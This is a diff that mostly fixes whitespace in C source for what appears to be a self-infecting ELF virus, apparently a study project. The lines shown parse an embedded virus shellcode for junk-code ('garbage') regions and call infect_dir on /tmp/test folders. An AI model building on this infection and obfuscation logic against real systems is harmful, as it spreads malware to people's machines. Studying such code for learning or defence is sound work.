@@ -47,41 +47,41 @@ int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 int set_garbage_infos(){
 	int64_t bin_start_off;
 	char **names = NULL;
-	
+
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
-	
+
 	int64_t off_gt_len;
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
- 	uint32_t gt_len = ((uint32_t *)((char *)(virus_shellcode + off_gt_len)))[0];
-	
+	uint32_t gt_len = ((uint32_t *)((char *)(virus_shellcode + off_gt_len)))[0];
+
 	int64_t off_gt;
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table", &off_gt);
 	Garbage *gt = ((Garbage *)((char *)(virus_shellcode + off_gt)));
 
-    Elf64_Shdr *symtab = NULL;
-    Elf64_Shdr *strtab = NULL;
+	Elf64_Shdr *symtab = NULL;
+	Elf64_Shdr *strtab = NULL;
 
 	if (!elf_get_tabs(virus_shellcode, virus_shellcode_len, &symtab, &strtab))
 		return FALSE;
 
-    Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
-    char *strs = ((char*)virus_shellcode) + strtab->sh_offset;
+	Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
+	char *strs = ((char*)virus_shellcode) + strtab->sh_offset;
 
 	uint32_t x = 0;
 	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
-    for (size_t i = 0; i < n; i++) {
+	for (size_t i = 0; i < n; i++) {
 		//WARNING: this algo may not work on other the linker
-        if (startswith(strs + sym[i].st_name, STR_GB_START)){
+		if (startswith(strs + sym[i].st_name, STR_GB_START)){
 			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_GB_END) &&
-				str_equal(strs + sym[i].st_name + slen(STR_GB_START),
-							 strs + sym[i+1].st_name + slen(STR_GB_END))))
+						str_equal(strs + sym[i].st_name + slen(STR_GB_START),
+							strs + sym[i+1].st_name + slen(STR_GB_END))))
 				return FALSE;
 			gt[x] = (Garbage){sym[i].st_value - bin_start_off, sym[i+1].st_value - sym[i].st_value};
 			//skip next
 			x += 1;
 			i += 1;
-        }
-    }
+		}
+	}
 	if (x != gt_len) return FALSE;
 }
 
@@ -109,7 +109,6 @@ int main(int ac, char **av){
 			opt.do_dns_remote = TRUE;
 		//else if (str_equal(av[i], "--big-recur"))
 		//	opt.print_msg = TRUE;
-	
 	}
 	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
 	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
